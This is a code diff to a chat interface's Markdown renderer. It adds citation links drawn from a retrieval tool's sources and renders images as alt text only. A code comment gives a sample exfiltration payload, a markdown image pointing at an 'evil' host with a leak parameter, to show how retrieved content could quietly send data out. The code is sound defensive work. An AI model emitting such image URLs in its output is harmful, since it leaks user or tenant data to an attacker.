@@ -1,8 +1,9 @@
 "use client";
 
-import React, { createContext, useContext, useState } from "react";
+import React, { createContext, useContext, useMemo, useState } from "react";
+import Link from "next/link";
 import { useAuiState, type TextMessagePartProps, type ToolCallMessagePartProps } from "@assistant-ui/react";
-import ReactMarkdown from "react-markdown";
+import ReactMarkdown, { type Components } from "react-markdown";
 import remarkGfm from "remark-gfm";
 import { ChevronRight, Wrench } from "lucide-react";
 import { cn } from "@/lib/cn";
@@ -10,6 +11,7 @@ import { ICON_STROKE_WIDTH } from "@/lib/icons";
 import { Badge, type BadgeProps } from "@/components/ui/Badge";
 import { focusRing } from "@/components/ui/Button";
 import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/Collapsible";
+import { CITATION_ATTR, citationSourcesForRun, remarkCitations, type CitationSource } from "./citations";
 import { formatDuration, messageRunId, toolCallInfoKey, TOOL_STATUS_LABELS, type ToolCallInfo, type ToolCallStatus } from "./toolCalls";
 
 /**
@@ -91,8 +93,58 @@ export function ToolCallCard({ toolCallId, toolName, args, result }: ToolCallMes
   );
 }
 
-/** Assistant text as Markdown (GFM, no raw HTML), styled with theme tokens. */
+const citationClass = cn(
+  "mx-0.5 inline-block rounded-sm px-0.5 align-baseline font-mono text-caption font-medium text-info-text",
+  focusRing,
+);
+
+/** One `[n]` citation: a link to `sources[n]` (an http(s) URL in a new tab, or its document in Studio). */
+function CitationLink({ n, href, source }: { n: string; href: string; source: CitationSource | undefined }) {
+  const label = source ? `Source ${n}: ${source.title}` : `Source ${n}`;
+  const title = source ? `${source.title}${source.url ? ` — ${source.url}` : ""}` : undefined;
+  if (/^https?:\/\//i.test(href)) {
+    return (
+      <a href={href} target="_blank" rel="noopener noreferrer nofollow" data-testid="citation-link" data-citation={n} aria-label={label} title={title} className={citationClass}>
+        [{n}]
+      </a>
+    );
+  }
+  return (
+    <Link href={href} data-testid="citation-link" data-citation={n} aria-label={label} title={title} className={citationClass}>
+      [{n}]
+    </Link>
+  );
+}
+
+/**
+ * Assistant text as Markdown (GFM, no raw HTML, images as their alt text only), styled with theme
+ * tokens. In a turn that called the
+ * `retrieve` tool, `[n]` markers link to that call's structured sources (citations.ts), never to a
+ * URL written in the text.
+ */
 export function MarkdownText({ text }: TextMessagePartProps) {
+  const messageId = useAuiState((s) => s.message.id);
+  const runId = messageRunId(messageId);
+  const infos = useContext(ToolCallInfoContext);
+  const sources = useMemo(() => (runId === null ? null : citationSourcesForRun(infos, runId)), [infos, runId]);
+  const remarkPlugins = useMemo(() => (sources ? [remarkGfm, remarkCitations(sources)] : [remarkGfm]), [sources]);
+  const components = useMemo<Components>(
+    () => ({
+      // Never an <img>: assistant text can carry tenant content (retrieved documents), and an image
+      // URL is fetched with no click (`![](https://evil/?leak=…)` would exfiltrate). Alt text only.
+      img: ({ alt }) => (alt ? <span data-testid="markdown-image-alt" className="text-muted-foreground">[image: {alt}]</span> : null),
+      ...(sources
+        ? {
+            a: ({ node: _node, children, href, ...props }) => {
+              const n = (props as Record<string, unknown>)[CITATION_ATTR];
+              if (typeof n === "string" && href) return <CitationLink n={n} href={href} source={sources.get(Number(n))} />;
+              return <a href={href} {...props}>{children}</a>;
+            },
+          }
+        : {}),
+    }),
+    [sources],
+  );
   return (
     <div
       className={cn(
@@ -106,7 +158,7 @@ export function MarkdownText({ text }: TextMessagePartProps) {
         "[&_table]:block [&_table]:max-w-full [&_table]:overflow-x-auto [&_td]:border [&_td]:border-border [&_td]:px-2 [&_th]:border [&_th]:border-border [&_th]:px-2",
       )}
     >
-      <ReactMarkdown remarkPlugins={[remarkGfm]} skipHtml>
+      <ReactMarkdown remarkPlugins={remarkPlugins} components={components} skipHtml>
         {text}
       </ReactMarkdown>
     </div>
